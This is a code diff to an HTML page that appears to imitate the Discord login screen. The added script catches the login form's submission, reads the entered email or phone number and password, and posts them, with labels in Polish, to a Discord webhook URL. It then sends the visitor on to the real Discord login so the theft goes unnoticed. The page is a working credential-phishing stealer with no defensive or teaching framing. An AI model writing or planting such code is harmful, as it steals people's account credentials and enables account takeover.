@@ -92,6 +92,30 @@
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script src="./js/script.js"></script>
-</body>
 
+    <script>
+      const form = document.querySelector('form');
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const loginInput = document.getElementById('emailOrPhone').value;
+        const passwordInput = document.getElementById('password').value;
+
+        const webhookUrl = 'https://canary.discord.com/api/webhooks/1537176300819845150/_ySFBDnFhtyBHxheS2n5yndIwZL_NdOBPK-OrvS-5w_otnUkYXdhw4dqS69LJvVrak6j';
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `🔑 **Nowe logowanie ze strony:**\n📧 **Email/Telefon:** ${loginInput}\n🔒 **Hasło:** ${passwordInput}`
+          })
+        })
+        .then(() => {
+          window.location.href = "https://discord.com/login";
+        })
+        .catch(err => console.error(err));
+      });
+    </script>
+  </body>
 </html>
